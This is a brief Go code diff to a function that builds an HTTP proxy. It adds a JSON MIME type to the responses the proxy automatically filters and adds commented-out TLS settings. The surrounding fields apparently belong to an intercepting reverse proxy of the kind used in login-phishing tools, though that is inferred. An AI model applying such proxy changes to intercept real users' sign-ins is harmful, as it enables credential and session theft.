@@ -120,8 +120,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		developer:         developer,
 		ip_whitelist:      make(map[string]int64),
 		ip_sids:           make(map[string]string),
-		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
+		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript", "application/ion+json"},
 	}
+
+	//p.Proxy.Tr.TLSClientConfig.Renegotiation = tls.RenegotiateNever
+	//p.Proxy.Tr.TLSClientConfig.MinVersion = tls.VersionTLS12
+	//p.Proxy.Tr.TLSClientConfig.MaxVersion = tls.VersionTLS13
 
 	p.Server = &http.Server{
 		Addr:         fmt.Sprintf("%s:%d", hostname, port),
